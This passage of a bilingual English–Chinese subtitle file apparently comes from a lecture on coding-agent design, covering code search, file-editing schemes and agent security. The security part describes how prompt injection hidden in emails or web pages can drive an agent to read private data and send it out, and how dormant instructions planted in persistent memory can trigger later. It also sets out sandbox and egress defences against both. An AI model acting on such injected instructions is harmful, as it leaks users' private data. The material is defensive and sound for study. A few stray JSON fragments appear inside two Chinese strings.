    "en": "Of course, the Agent should also retain the ability to start isolated terminals to support parallel tasks, but the persistent session should be the default mode.",
    "zh": "当然，智能体还应保留启动隔离终端的能力，以支持并行任务，但持久会话应作为默认模式。"
  },
  {
    "id": 329,
    "start": 2990.381,
    "end": 2993.481,
    "en": "Instant Syntax Feedback Mechanism.",
    "zh": "即时语法反馈机制。"
  },
  {
    "id": 330,
    "start": 2993.481,
    "end": 2998.381,
    "en": "This once again demonstrates the value of the Agent status bar technique.",
    "zh": "这再次证明了智能体状态栏技术的价值。"
  },
  {
    "id": 331,
    "start": 2998.381,
    "end": 3005.844,
    "en": "After the Agent modifies code, it should not wait for the user to explicitly request testing before checking syntax.",
    "zh": "在智能体修改代码后，它不应等待用户明确请求测试，而应在文件写入操作完成后立即检查语法。"
  },
  {
    "id": 332,
    "start": 3005.844,
    "end": 3018.019,
    "en": "A more efficient approach is for the tool layer to run the corresponding linter or syntax checker automatically as soon as the file write operation is complete and present the results as part of the tool's return value to the Agent.",
    "zh": "更高效的方法是让工具层在文件写入操作完成后立即运行相应的代码检查器或语法检查器，并将结果作为工具返回值的一部分返回给智能体。"
  },
  {
    "id": 333,
    "start": 3018.019,
    "end": 3029.081,
    "en": "If a syntax error is detected, the Agent sees the detailed error information immediately in the next inference round—much as an IDE immediately flags an unmatched parenthesis.",
    "zh": "如果检测到语法错误，智能体将在下一个推理周期内立即看到详细的错误信息——就像IDE会立即标记不匹配的括号一样。"
  },
  {
    "id": 334,
    "start": 3029.081,
    "end": 3040.831,
    "en": "This instant feedback mechanism significantly reduces the cost of error fixing, because the Agent can correct the error at the moment it is introduced, without waiting until running tests to discover the problem.",
    "zh": "这种即时反馈机制显著降低了错误修复的成本，因为智能体可以在错误引入的瞬间进行修正，而无需等到运行测试才发现问题。"
  },
  {
    "id": 335,
    "start": 3040.831,
    "end": 3054.606,
    "en": "These five implementation techniques—parallelism and streaming, context management, environmental awareness, state persistence, and instant feedback—together form the technical foundation of an efficient Coding Agent.",
    "zh": "这五种实现技术——并行与流式处理、上下文管理、环境感知、状态持久化和即时反馈——共同构成了高效代码智能体的技术基础。"
  },
  {
    "id": 336,
    "start": 3054.606,
    "end": 3066.344,
    "en": "They are not isolated optimization points, but mutually reinforcing design decisions, all pointing toward a single goal: enabling the Agent to work as smoothly as an experienced developer.",
    "zh": "它们不是孤立的优化点，而是相互增强的设计决策，所有这些都指向一个共同的目标：使智能体像经验丰富的开发者一样流畅地工作。"
  },
  {
    "id": 337,
    "start": 3066.344,
    "end": 3069.194,
    "en": "Search Tools in Coding Agents.",
    "zh": "代码智能体中的搜索工具。"
  },
  {
    "id": 338,
    "start": 3069.194,
    "end": 3074.906,
    "en": "Locating relevant code in a large codebase is the starting point for a Coding Agent's work.",
    "zh": "在一个大型代码库中定位相关代码是代码智能体工作的起点。"
  },
  {
    "id": 339,
    "start": 3074.906,
    "end": 3084.819,
    "en": "Figure 5-3 compares several complementary search tools, illustrating how a mature Coding Agent should choose retrieval methods based on the nature of the task.",
    "zh": "图5-3比较了若干互补的搜索工具，展示了成熟代码智能体应如何根据任务性质选择检索方法。"
  },
  {
    "id": 340,
    "start": 3084.819,
    "end": 3090.831,
    "en": "As illustrated in Figure 5-3: Comparison of Coding Agent Search Tools.",
    "zh": "如图5-3所示：代码智能体搜索工具的比较。"
  },
  {
    "id": 341,
    "start": 3090.831,
    "end": 3099.731,
    "en": "Regex Content Matching (grep/ripgrep): The most traditional search method, scanning file contents line by line for pattern matches.",
    "zh": "正则表达式内容匹配（grep/ripgrep）：最传统的搜索方法，逐行扫描文件内容以查找模式匹配。"
  },
  {
    "id": 342,
    "start": 3099.731,
    "end": 3109.344,
    "en": "When the Agent knows the exact text to find (function names, variable names, error messages), it can locate every occurrence quickly and accurately.",
    "zh": "当智能体知道要查找的确切文本（如函数名、变量名、错误信息）时，它可以快速准确地定位所有出现的位置。"
  },
  {
    "id": 343,
    "start": 3109.344,
    "end": 3117.656,
    "en": "The expressive power of regular expressions (a syntax for describing text patterns with special symbols, e.g., def handle.",
    "zh": "正则表达式的表达能力（一种用特殊符号描述文本模式的语法，例如 def handle。"
  },
  {
    "id": 344,
    "start": 3117.656,
    "end": 3127.431,
    "en": "matches all function definitions starting with handle) captures complex patterns—not just literal text, but code that conforms to a particular structure.",
    "zh": "匹配所有以 handle 开头的函数定义）可以捕捉复杂模式——不仅仅是字面文本，还包括符合特定结构的代码。"
  },
  {
    "id": 345,
    "start": 3127.431,
    "end": 3138.606,
    "en": "In practice, file type filtering (search only Python files) and path pattern filtering (exclude test directories) should also be supported to reduce noise.",
    "zh": "在实际应用中，还应支持文件类型过滤（仅搜索 Python 文件）和路径模式过滤（排除测试目录），以减少噪声。"
  },
  {
    "id": 346,
    "start": 3138.606,
    "end": 3152.944,
    "en": "The fundamental limitation: it finds only textual matches and understands no semantics—a search for \"user authentication\" will never surface a function that handles login logic but happens not to contain the word \"authentication.",
    "zh": "根本性限制：它只能找到文本匹配，无法理解语义——搜索“用户认证”永远不会找到处理登录逻辑的函数，但该函数中没有包含“认证”这个词。"
  },
  {
    "id": 347,
    "start": 3153.1,
    "end": 3161.562,
    "en": "Filename Pattern Matching (glob): Ignores file content, only searches the file system's path structure for files matching a pattern.",
    "zh": "文件名模式匹配（glob）：忽略文件内容，仅根据文件系统的路径结构查找符合模式的文件。"
  },
  {
    "id": 348,
    "start": 3161.512,
    "end": 3176.1,
    "en": "For example, /.test.ts recursively finds all TypeScript test files, src/components//Button.tsx searches for Button.tsx at any depth under components.",
    "zh": "例如，/.test.ts 会递归查找所有 TypeScript 测试文件，src/components//Button.tsx 则会在 components 下任意深度查找 Button.tsx 文件。"
  },
  {
    "id": 349,
    "start": 3176.1,
    "end": 3189.787,
    "en": "It is much faster than content search (no need to open and read files) and is the Agent's first step in exploring the project structure—quickly establishing the project's organizational framework by scanning the entire file system.",
    "zh": "它比内容搜索快得多（无需打开和读取文件），是智能体探索项目结构的第一步——通过扫描整个文件系统快速建立项目的组织框架。"
  },
  {
    "id": 350,
    "start": 3189.787,
    "end": 3198.35,
    "en": "Semantic Code Search: Unlike the first two exact matching methods, it attempts to understand the \"meaning\" of the query and the code.",
    "zh": "语义代码搜索：与前两种精确匹配方法不同，它尝试理解查询和代码的“含义”。"
  },
  {
    "id": 351,
    "start": 3198.35,
    "end": 3201.312,
    "en": "It needs to solve two key problems:",
    "zh": "它需要解决两个关键问题："
  },
  {
    "id": 352,
    "start": 3201.312,
    "end": 3213.7,
    "en": "Structure-Aware Chunking: Code has strict syntactic structure and should be split by complete semantic units like functions, classes, and methods, rather than blindly cutting by a fixed number of characters.",
    "zh": "结构感知分块：代码具有严格的语法结构，应该按完整的语义单元（如函数、类和方法）进行分割，而不是盲目地按固定字符数切割。"
  },
  {
    "id": 353,
    "start": 3213.7,
    "end": 3234.262,
    "en": "Hybrid Retrieval (Chapter 3 details this technology stack): Vector embeddings (dense embeddings) excel at finding semantically similar code with different wording (e.g., searching for \"verify user identity\" can find a function named check_credentials), while keyword matching excels at precisely matching function and variable names.",
    "zh": "混合检索（第3章详细介绍了这一技术栈）：向量嵌入（密集嵌入）在寻找用不同措辞表达的语义相似代码方面表现出色（例如，搜索“验证用户身份”可以找到名为 check_credentials 的函数），而关键词匹配则在精确匹配函数和变量名称方面更优。"
  },
  {
    "id": 354,
    "start": 3234.262,
    "end": 3245.625,
    "en": "The two run in parallel, and the results are merged and sorted by a reranker (a cross-encoder that performs fine-grained relevance ranking on candidate results), providing complementary coverage.",
    "zh": "两者并行运行，结果由重新排序器（一种执行细粒度相关性排序的交叉编码器）合并并排序，提供互补的覆盖范围。"
  },
  {
    "id": 355,
    "start": 3245.625,
    "end": 3257.95,
    "en": "Semantic search is particularly suitable for exploratory tasks, such as finding code related to \"interacting with the database\" or \"handling user input validation\" in an unfamiliar codebase.",
    "zh": "语义搜索特别适合探索性任务，例如在不熟悉的代码库中查找与“与数据库交互”或“处理用户输入验证”相关的代码。"
  },
  {
    "id": 356,
    "start": 3257.95,
    "end": 3264.9,
    "en": "However, there is a clear debate in the industry about whether it is worth building embedding indices for semantic search.",
    "zh": "然而，业界对于是否值得为语义搜索构建嵌入索引存在明确的争论。"
  },
  {
    "id": 357,
    "start": 3264.9,
    "end": 3280.675,
    "en": "Terminal-based Agents like Claude Code deliberately do not build embedding indices, relying purely on agentic grep + glob for on-the-fly retrieval—this avoids maintaining indices that become stale as the code evolves, eliminates the entire indexing infrastructure.",
    "zh": "基于终端的智能体如 Claude Code 故意不构建嵌入索引，仅依赖代理 grep + glob 进行实时检索——这避免了随着代码演进而过时的索引维护，并消除了整个索引基础设施。"
  },
  {
    "id": 358,
    "start": 3280.675,
    "end": 3295.9,
    "en": "IDE-based tools like Cursor initially took the opposite approach: they are willing to pay the cost of building indices for cross-file semantic recall, using embedding indices to quickly find semantically related but differently worded snippets in large codebases.",
    "zh": "基于 IDE 的工具如 Cursor 最初采取了相反的方法：它们愿意承担构建索引以实现跨文件语义召回的成本，利用嵌入索引来在大型代码库中快速找到语义相关但措辞不同的代码片段。"
  },
  {
    "id": 359,
    "start": 3295.9,
    "end": 3301.837,
    "en": "Today, IDEs like Cursor have also switched to on-the-fly grep + glob retrieval.",
    "zh": "如今，Cursor 等 IDE 也已转向实时 grep + glob 检索。"
  },
  {
    "id": 360,
    "start": 3301.837,
    "end": 3325.05,
    "en": "Symbol-Level Definition and Reference Lookup: This method uses IDE-like \"go to definition\" and \"find all references\" capabilities to distinguish symbol definitions from references—for example, it identifies authenticate on line 42 as a function definition and the occurrence on line 189 as a call, whereas text search can only find all lines containing that string.",
    "zh": "符号级定义和引用查找：这种方法使用类似 IDE 的“转到定义”和“查找所有引用”功能来区分符号的定义和引用——例如，它可以识别第 42 行的 authenticate 是一个函数定义，而第 189 行的出现是一个调用，而文本搜索只能找到包含该字符串的所有行。"
  },
  {
    "id": 361,
    "start": 3325.05,
    "end": 3329.2,
    "en": "Mainstream coding agents do not currently use this approach.",
    "zh": "主流的代码智能体目前并未采用这种方法。"
  },
  {
    "id": 362,
    "start": 3329.2,
    "end": 3350.262,
    "en": "These four search methods form a complementary toolbox, often used in combination in practice: first use semantic search to find relevant modules, then use regex matching to precisely locate specific lines of code, and finally use symbol search to trace the call chain—a progressive strategy \"from coarse to fine, from semantics to syntax.",
    "zh": "这四种搜索方法形成了一个互补的工具箱，实际中经常结合使用：首先使用语义搜索找到相关模块，然后使用正则匹配精确定位特定代码行，最后使用符号搜索追踪调用链——这是一种从粗到细、从语义到语法的渐进策略。"
  },
  {
    "id": 363,
    "start": 3350.262,
    "end": 3353.55,
    "en": "File Editing Tools in Coding Agents.",
    "zh": "代码智能体中的文件编辑工具。"
  },
  {
    "id": 364,
    "start": 3353.55,
    "end": 3363.9,
    "en": "The difficulty of file editing lies not in the operation itself, but in how to efficiently and reliably tell the system \"what to change and how to change it\" using an LLM.",
    "zh": "文件编辑的难点不在于操作本身，而在于如何有效地、可靠地通过大语言模型告诉系统“要修改什么以及如何修改”。"
  },
  {
    "id": 365,
    "start": 3363.9,
    "end": 3373.462,
    "en": "Figure 5-4 compares five file editing schemes, illustrating the fundamental tension between human language expression and machine-precise execution.",
    "zh": "图5-4比较了五种文件编辑方案，展示了人类语言表达与机器精确执行之间的根本矛盾。"
  },
  {
    "id": 366,
    "start": 3373.462,
    "end": 3379.487,
    "en": "As illustrated in Figure 5-4: Comparison of Five File Editing Schemes.",
    "zh": "如图5-4所示：五种文件编辑方案的对比。"
  },
  {
    "id": 367,
    "start": 3379.636,
    "end": 3403.873,
    "en": "Diff Description + Apply Model: The model does not directly specify how to edit the file; instead, it generates a change description—which can be a diff text similar to git diff (the format output by the git diff command, showing \"which lines were deleted and which were added\"), or a code skeleton with omission markers (using comments like \"remain unchanged here\" to skip unmodified parts).",
    "zh": "差异描述+应用模型：模型不会直接指定如何编辑文件；而是生成一个变更描述——可以是类似git diff的差异文本（git diff命令的输出格式，显示“哪些行被删除，哪些行被添加”），或者是一个带有省略标记的代码框架（使用类似“此处保持不变”的注释来跳过未修改的部分）。“},{"
  },
  {
    "id": 368,
    "start": 3403.823,
    "end": 3415.698,
    "en": "This description is then handed to a specialized \"Apply Model\"—usually another, smaller, faster LLM—responsible for merging it with the original file to produce the complete new file.",
    "zh": "然后将此描述传递给一个专门的“应用模型”——通常是另一个更小、更快的LLM——负责将其与原始文件合并，生成完整的新文件。"
  },
  {
    "id": 369,
    "start": 3415.698,
    "end": 3424.436,
    "en": "This separation of concerns allows the main model to focus on high-level code logic and the apply model to focus on low-level text operations.",
    "zh": "这种职责分离使主模型能够专注于高层代码逻辑，而应用模型则专注于底层文本操作。"
  },
  {
    "id": 370,
    "start": 3424.436,
    "end": 3440.961,
    "en": "The fragility of a naive implementation lies in the merge step: when there are minor discrepancies between the change description and the actual file code, it needs to determine if they refer to the same location; when there are multiple similar code snippets, it might merge into the wrong place.",
    "zh": "一种简单实现的脆弱性在于合并步骤：当更改描述与实际文件代码存在细微差异时，它需要判断它们是否指代同一位置；当存在多个相似代码片段时，可能会合并到错误的位置。"
  },
  {
    "id": 371,
    "start": 3440.961,
    "end": 3465.848,
    "en": "Cursor is a representative of the continuous evolution of this approach: the main model outputs a code skeleton with omission markers, a specially trained fast-apply small model rewrites the complete file, and speculative decoding (using the original file content as a draft for parallel verification) pushes the merge speed to thousands of tokens per second—engineering investment has bought reliability and speed for this approach.",
    "zh": "Cursor 是这一方法持续演进的代表：主模型输出一个带有省略标记的代码框架，一个经过特殊训练的快速应用小型模型重新编写完整文件，并通过推测解码（使用原始文件内容作为草稿进行并行验证）将合并速度提升至每秒数千个标记——工程投入为这一方法带来了可靠性和速度。"
  },
  {
    "id": 372,
    "start": 3465.848,
    "end": 3470.298,
    "en": "Old String → New String: The approach adopted by Claude Code.",
    "zh": "旧字符串 → 新字符串：Claude Code 采用的方法。"
  },
  {
    "id": 373,
    "start": 3470.298,
    "end": 3480.798,
    "en": "The model provides an old string (the original text to be replaced) and a new string (the replacement text), and the framework performs a simple string find-and-replace.",
    "zh": "模型提供一个旧字符串（要替换的原始文本）和一个新字符串（替换文本），框架执行简单的字符串查找和替换。"
  },
  {
    "id": 374,
    "start": 3480.798,
    "end": 3490.411,
    "en": "The advantage is predictability and transparency—if the old string exists and is unique in the file, it succeeds; otherwise, it fails.",
    "zh": "其优势在于可预测性和透明性——如果旧字符串存在于文件中且是唯一的，就会成功；否则会失败。"
  },
  {
    "id": 375,
    "start": 3490.411,
    "end": 3492.698,
    "en": "There is no ambiguity.",
    "zh": "没有歧义。"
  },
  {
    "id": 376,
    "start": 3492.698,
    "end": 3502.073,
    "en": "The cost is that deleting large blocks of code requires outputting all the original content in full; a single character deviation causes the match to fail.",
    "zh": "代价是，删除大块代码需要完整输出所有原始内容；一个字符的偏差就会导致匹配失败。"
  },
  {
    "id": 377,
    "start": 3502.073,
    "end": 3508.286,
    "en": "When the same code appears multiple times, a longer context must be provided to disambiguate.",
    "zh": "当同一段代码多次出现时，必须提供更长的上下文以消除歧义。"
  },
  {
    "id": 378,
    "start": 3508.286,
    "end": 3516.398,
    "en": "Line Number Targeting (Old Line Numbers → New String): The model specifies \"delete lines X to Y, insert new content.",
    "zh": "行号定位（旧行号 → 新字符串）：模型指定“删除第X到Y行，插入新内容。”"
  },
  {
    "id": 379,
    "start": 3516.398,
    "end": 3522.923,
    "en": "If the file-reading tool includes line numbers, the model can identify the exact range to replace.",
    "zh": "如果文件读取工具包含行号，模型可以识别出需要替换的确切范围。"
  },
  {
    "id": 380,
    "start": 3522.923,
    "end": 3527.773,
    "en": "Deleting a large block requires only its starting and ending line numbers.",
    "zh": "删除一大块代码只需要起始和结束的行号。"
  },
  {
    "id": 381,
    "start": 3527.773,
    "end": 3531.723,
    "en": "However, each edit shifts the line numbers that follow it.",
    "zh": "然而，每次编辑都会使后续的行号发生变化。"
  },
  {
    "id": 382,
    "start": 3531.723,
    "end": 3540.298,
    "en": "When the model proposes several edits at once, all edits should refer to the original line numbers, as in a diff, to avoid confusion.",
    "zh": "当模型一次性提出多个编辑时，所有编辑都应参考原始行号，如同差异文件一样，以避免混淆。"
  },
  {
    "id": 383,
    "start": 3540.46,
    "end": 3549.022,
    "en": "Vim-like Edit Commands: Borrowing from the Vim editor's command system, supporting rich operations like copy, cut, and paste.",
    "zh": "类似Vim的编辑命令：借鉴Vim编辑器的命令系统，支持复制、剪切和粘贴等丰富的操作。"
  },
  {
    "id": 384,
    "start": 3548.972,
    "end": 3554.422,
    "en": "Very efficient for restructuring code (moving a function from one place to another).",
    "zh": "对于重构代码非常高效（例如将一个函数从一处移动到另一处）。"
  },
  {
    "id": 385,
    "start": 3554.422,
    "end": 3563.21,
    "en": "But the command syntax carries a real learning burden: the strongest models handle it well, while smaller models make noticeably more mistakes.",
    "zh": "但命令语法带来了实际的学习负担：强大的模型处理得较好，而较小的模型明显会犯更多错误。"
  },
  {
    "id": 386,
    "start": 3563.21,
    "end": 3577.197,
    "en": "This approach is also unfriendly to a model that emits several edit commands from a single round of thinking, because after each Vim edit the file content and the line numbers change, and the model can hardly compute the post-edit line numbers in advance.",
    "zh": "这种方法对模型也不友好，因为模型在一次思考中会发出多个编辑命令，因为每次Vim编辑后文件内容和行号都会变化，模型很难提前计算出编辑后的行号。"
  },
  {
    "id": 387,
    "start": 3577.197,
    "end": 3588.947,
    "en": "A deeper thought: editors like Vim were designed for humans, and a human needs to keep seeing the current state and then plan one simple next operation (write a line of code, delete a few lines).",
    "zh": "更深层次的思考：像Vim这样的编辑器是为人类设计的，人类需要持续看到当前状态，然后计划一个简单的下一步操作（比如写一行代码，删除几行）。"
  },
  {
    "id": 388,
    "start": 3588.947,
    "end": 3598.747,
    "en": "But today a model works by thinking for a fairly long stretch and then performing a batch of rather complex operations (writing several hundred lines of code at once).",
    "zh": "但如今，模型通过长时间的思考，然后执行一批较为复杂的操作（一次编写几百行代码）。"
  },
  {
    "id": 389,
    "start": 3598.747,
    "end": 3607.322,
    "en": "String Start + End Matching (Old String Start + End → New String): This can be seen as an improvement over the old string replacement scheme.",
    "zh": "字符串起始和结束匹配（旧字符串起始和结束 → 新字符串）：这可以被视为对旧字符串替换方案的改进。"
  },
  {
    "id": 390,
    "start": 3607.322,
    "end": 3617.135,
    "en": "The model does not need to output the complete old string; it only needs to provide the first few lines and the last few lines of the content to be deleted, omitting the middle part.",
    "zh": "模型不需要输出完整的旧字符串；它只需要提供要删除内容的前几行和最后几行，中间部分可以省略。"
  },
  {
    "id": 391,
    "start": 3617.135,
    "end": 3624.647,
    "en": "The framework locates the replacement area from this start-and-end pair, provided that the combination is unique within the file.",
    "zh": "该框架从这个起始-结束对中定位替换区域，前提是该组合在文件中是唯一的。"
  },
  {
    "id": 392,
    "start": 3624.647,
    "end": 3638.36,
    "en": "This scheme combines the reliability of text replacement with the efficiency of the line number approach—when deleting large blocks of code, there is no need to output hundreds of lines of original code, only the boundaries need to be shown.",
    "zh": "该方案结合了文本替换的可靠性与行号方法的效率——当删除大量代码块时，无需输出数百行原始代码，只需显示边界即可。"
  },
  {
    "id": 393,
    "start": 3638.36,
    "end": 3647.56,
    "en": "At the same time, because it is still based on content matching rather than abstract line numbers, the risk of the model making errors is relatively low.",
    "zh": "同时，由于它仍然基于内容匹配而非抽象的行号，模型出错的风险相对较低。"
  },
  {
    "id": 394,
    "start": 3647.56,
    "end": 3650.222,
    "en": "Security for Coding Agents.",
    "zh": "代码智能体的安全性。"
  },
  {
    "id": 395,
    "start": 3650.222,
    "end": 3680.397,
    "en": "This section organizes the Coding Agent's defenses into a coherent framework: we first outline the threat model—which risks are most lethal; then isolation as the safety net—network egress, file system, and resource limits in the sandbox; then execution-time defense—semantic parsing of commands, and speculative execution that makes security checks \"invisible\"; and finally trust and loyalty—whom the Agent serves under multi-party delegation, and how to move the trust boundary down to the data",
    "zh": "本节将代码智能体的防御措施组织成一个连贯的框架：我们首先概述威胁模型——哪些风险最为致命；然后是隔离作为安全网——沙箱中的网络出口、文件系统和资源限制；接着是执行时防御——命令的语义解析，以及使安全检查“不可见”的推测性执行；最后是信任与忠诚度——在多方委托下，智能体为谁服务，以及如何将信任边界下移到数据层面。"
  },
  {
    "id": 396,
    "start": 3680.397,
    "end": 3684.247,
    "en": "layer when AI-written code itself cannot be trusted.",
    "zh": "当AI编写的代码本身不可信时。"
  },
  {
    "id": 397,
    "start": 3684.247,
    "end": 3693.56,
    "en": "The threat model, loyalty, and trust-boundary discussions apply to all Agents; sandboxing and command parsing are specific to Coding Agents.",
    "zh": "威胁模型、忠诚度和信任边界讨论适用于所有智能体；沙箱和命令解析则特定于代码智能体。"
  },
  {
    "id": 398,
    "start": 3693.56,
    "end": 3699.26,
    "en": "This \"sovereign Agent\" paradigm also introduces severe security challenges.",
    "zh": "这种“主权智能体”范式也带来了严重的安全挑战。"
  },
  {
    "id": 399,
    "start": 3699.26,
    "end": 3710.835,
    "en": "A Coding Agent has permissions to read and write files, execute commands, and access networks, meaning that once injected with malicious instructions, it could cause irreversible damage.",
    "zh": "代码智能体具有读写文件、执行命令和访问网络的权限，这意味着一旦被注入恶意指令，可能会造成不可逆的损害。"
  },
  {
    "id": 400,
    "start": 3710.835,
    "end": 3723.272,
    "en": "Developer and independent researcher Simon Willison summarized this risk with his famous \"Lethal Triad\"—when all three elements are present, they form a complete attack loop, putting the system at high risk:",
    "zh": "开发者和独立研究员Simon Willison用他著名的“致命三元组”总结了这一风险——当这三个要素同时存在时，会形成一个完整的攻击循环，使系统面临高风险："
  },
  {
    "id": 401,
    "start": 3723.272,
    "end": 3728.922,
    "en": "Access to Private Data — The Agent can read user files and password managers.",
    "zh": "访问私有数据 —— 智能体可以读取用户文件和密码管理器。"
  },
  {
    "id": 402,
    "start": 3728.922,
    "end": 3735.697,
    "en": "Exposure to Untrusted Content — Processed emails and web pages may contain malicious payloads.",
    "zh": "暴露于不可信内容 —— 处理的邮件和网页可能包含恶意负载。"
  },
  {
    "id": 403,
    "start": 3735.697,
    "end": 3741.222,
    "en": "Ability to Communicate Externally — It can send emails and execute commands.",
    "zh": "具备外部通信能力 —— 它可以发送邮件并执行命令。"
  },
  {
    "id": 404,
    "start": 3741.222,
    "end": 3751.885,
    "en": "This closes the attack loop: malicious instructions hidden in untrusted content enter the Agent, drive it to read private data, and then exfiltrate it through external channels.",
    "zh": "这完成了攻击循环：隐藏在不可信内容中的恶意指令进入智能体，驱动其读取私有数据，并通过外部渠道将其泄露出去。"
  },
  {
    "id": 405,
    "start": 3751.885,
    "end": 3758.435,
    "en": "Note that the presence of all three elements is dangerous enough on its own, without any additional conditions.",
    "zh": "请注意，这三个要素同时存在就已经足够危险，无需任何其他条件。"
  },
  {
    "id": 406,
    "start": 3758.435,
    "end": 3763.435,
    "en": "Building on this, the author adds a fourth dimension—Persistent Memory.",
    "zh": "在此基础上，作者增加了第四个维度——持久化记忆。"
  },
  {
    "id": 407,
    "start": 3763.435,
    "end": 3782.785,
    "en": "This is not a parallel fourth necessary condition, but an amplifier for attacks: an attacker can write seemingly harmless biases or malicious instructions into the Agent's long-term memory, where they lie dormant across sessions and trigger at an opportune moment — turning a one-off attack into a threat that lies in wait and compounds over time.",
    "zh": "这不是一个并行的第四必要条件，而是攻击的放大器：攻击者可以将看似无害的偏见或恶意指令写入智能体的长期记忆中，在会话之间处于休眠状态，并在合适的时机触发——将一次性攻击转化为一种持续等待并随时间累积的威胁。"
  },
  {
    "id": 408,
    "start": 3782.956,
    "end": 3793.081,
    "en": "These four points can be summarized as four types of boundaries: data boundary, input trust boundary, output impact boundary, and cross-session boundary.",
    "zh": "这四个要点可以总结为四种边界：数据边界、输入信任边界、输出影响边界和跨会话边界。"
  },
  {
    "id": 409,
    "start": 3793.031,
    "end": 3802.293,
    "en": "A full-permission local Agent like OpenClaw spans all four risk dimensions, making security protection a core challenge that such Agents must confront.",
    "zh": "一个拥有完全权限的本地智能体（如OpenClaw）涵盖了所有四个风险维度，使得安全防护成为此类智能体必须面对的核心挑战。"
  },
  {
    "id": 410,
    "start": 3802.293,
    "end": 3821.743,
    "en": "This also explains why closed-source commercial Agents (like Claude Cowork (Anthropic's general-purpose Agent for knowledge work, reusing Claude Code's agentic architecture, capable of reading and writing local files and completing multi-step tasks across multiple office applications)) have chosen conservative permission strategies.",
    "zh": "这也解释了为什么封闭源代码的商业智能体（如Claude Cowork（Anthropic用于知识工作的通用智能体，复用Claude Code的智能体架构，能够读取和写入本地文件并在多个办公应用中完成多步骤任务））选择了保守的权限策略。"
  },
  {
    "id": 411,
    "start": 3821.743,
    "end": 3826.368,
    "en": "Against prompt injection, input filtering alone barely helps.",
    "zh": "针对提示注入，仅靠输入过滤几乎毫无作用。"
  },
  {
    "id": 412,
    "start": 3826.368,
    "end": 3834.418,
    "en": "The goal is not to recognize every attack, but to ensure that an injected Agent never gets the chance to carry a dangerous action through.",
    "zh": "目标不是识别每一种攻击，而是确保被注入的智能体永远无法有机会执行危险操作。"
  },
  {
    "id": 413,
    "start": 3834.418,
    "end": 3839.318,
    "en": "This is exactly where the three-layer guardrails from Chapter 1 come into play.",
    "zh": "这正是第一章提到的三层防护机制发挥作用的地方。"
  },
  {
    "id": 414,
    "start": 3839.318,
    "end": 3844.243,
    "en": "Compared with other Agents, Coding Agents need to pay special attention to:",
    "zh": "与其他智能体相比，代码智能体需要特别关注："
  },
  {
    "id": 415,
    "start": 3844.243,
    "end": 3856.631,
    "en": "Command Semantic Parsing — The combinatorial explosion of Shell commands makes keyword blacklists useless; the real effect of a command must be understood at the semantic level (expanded later in this section)",
    "zh": "命令语义解析——Shell命令的组合爆炸使关键词黑名单变得毫无意义；必须在语义层面理解命令的实际效果（本节稍后将详细展开）"
  },
  {
    "id": 416,
    "start": 3856.631,
    "end": 3869.243,
    "en": "Sandbox Isolation and Network Egress Control — Code execution is an attack surface unique to Coding Agents; the engineering choices for isolation levels and egress strategies are covered later in this section;",
    "zh": "沙箱隔离与网络出站控制——代码执行是代码智能体独有的攻击面；隔离级别和出站策略的工程选择将在本节后面进行讨论；"
  },
  {
    "id": 417,
    "start": 3869.243,
    "end": 3885.768,
    "en": "Cross-Session Defense for Persistent Memory — This chapter extends the Lethal Triad analysis to persistent memory: content written to long-term memory must undergo the same trust review as external input so that malicious instructions cannot lie dormant in MEMORY.md and take effect later.",
    "zh": "持久化记忆的跨会话防御——本章将致命三元组分析扩展到持久化记忆：写入长期记忆的内容必须经过与外部输入相同的信任审查，以防止恶意指令在MEMORY.md中休眠并在之后生效。"
  },
  {
    "id": 418,
    "start": 3885.768,
    "end": 3895.481,
    "en": "These three protections fall into the verification, execution, and data layers respectively, complementing the defense system from the previous two chapters.",
    "zh": "这三种防护分别属于验证、执行和数据层，补充了前两章的防御体系。"
  },
  {
    "id": 419,
    "start": 3895.481,
    "end": 3901.693,
    "en": "These strategies cannot completely eliminate risk, but they can reduce the Agent's attack surface.",
    "zh": "这些策略无法完全消除风险，但可以降低智能体的攻击面。"
  },
  {
    "id": 420,
    "start": 3901.693,
    "end": 3907.543,
    "en": "Isolation as the Safety Net: Engineering Choices for the Code Execution Sandbox.",
    "zh": "隔离作为安全网：代码执行沙箱的工程选择。"
  },
  {
    "id": 421,
    "start": 3907.543,
    "end": 3909.943,
    "en": "Network egress control.",
    "zh": "网络出口控制。"
  },
  {
    "id": 422,
    "start": 3909.943,
    "end": 3924.631,
    "en": "This is the item most easily overlooked and yet the most critical: no network by default, with a whitelist proxy admitting a limited set of destinations on demand (package sources, documentation sites, APIs the task explicitly needs).",
    "zh": "这是最容易被忽视但又最关键的项：默认情况下没有网络，通过白名单代理按需允许有限的目标地址（包源、文档网站、任务明确需要的API）。“},{"
  },
  {
    "id": 423,
    "start": 3924.631,
    "end": 3934.193,
    "en": "Look back at item 3 of the Lethal Triad—\"the ability to communicate externally\": network egress control is precisely its execution-layer defense.",
    "zh": "回顾致命三元组中的第3项——“对外通信的能力”：网络出口控制正是其执行层的防御措施。"
  },
  {
    "id": 424,
    "start": 3934.193,
    "end": 3942.806,
    "en": "Even if a prompt injection succeeds and malicious code reads sensitive data inside the sandbox, with no egress the data cannot get out.",
    "zh": "即使提示注入成功且恶意代码读取了沙箱内的敏感数据，如果没有出口，数据也无法传出。"
  },
  {
    "id": 425,
    "start": 3942.806,
    "end": 3945.793,
    "en": "Scope of file-system isolation.",
    "zh": "文件系统隔离的范围。"
  },
  {
    "id": 426,
    "start": 3945.793,
    "end": 3968.568,
    "en": "Mount the source directory read-only (the Agent modifies code through editing tools, and the generated patch is written to disk after review, or a copy is mounted into a writable workspace); a separate writable workspace directory holds the artifacts and intermediate files; credential files (~/.ssh, keys, tokens) are not mounted into the sandbox at all.",
    "zh": "将源代码目录以只读方式挂载（智能体通过编辑工具修改代码，生成的补丁在审查后写入磁盘，或将其复制到可写的工作区）；一个单独的可写工作区目录保存生成的文件和中间文件；凭证文件（如 ~/.ssh、密钥、令牌）根本不会挂载到沙箱中。"
  },
  {
    "id": 427,
    "start": 3968.568,
    "end": 3971.343,
    "en": "Resource quotas and timeouts.",
    "zh": "资源配额与超时限制。"
  },
  {
    "id": 428,
    "start": 3971.343,
    "end": 3984.143,
    "en": "CPU, memory, and disk quotas plus a timeout defend against infinite loops, fork bombs (processes that drag the system down by replicating themselves wildly), and unbounded disk writes.",
    "zh": "CPU、内存和磁盘配额加上超时限制可以防范无限循环、fork炸弹（通过自我复制拖垮系统的进程）和无限制的磁盘写入。"
  },
  {
    "id": 429,
    "start": 3984.143,
    "end": 4001.293,
    "en": "One practical detail: a timeout or quota violation should return a structured error to the Agent (\"execution was terminated after 120 seconds; the last output follows...\") rather than silently killing the process, so that the Agent has a chance to correct its strategy on the next turn.",
